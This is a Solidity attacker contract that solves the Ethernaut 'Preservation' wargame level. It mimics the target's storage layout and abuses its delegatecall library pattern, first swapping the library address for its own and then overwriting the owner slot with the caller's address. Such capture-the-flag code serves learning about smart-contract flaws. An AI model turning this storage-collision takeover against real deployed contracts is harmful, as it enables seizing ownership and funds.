// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Preservation} from "ethernaut/levels/Preservation.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; // target storage slot!

    Preservation target;

    constructor(address _target) {
        target = Preservation(_target);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        // this call causes `timeZone1Library` to point to our attacker contract
        target.setFirstTime(uint256(uint160(address(this))));

        // and then we call our attacker contract's `setTime` defined above, which
        // overwrites the `owner` slot with our address
        target.setFirstTime(uint256(uint160(msg.sender)));
    }
}
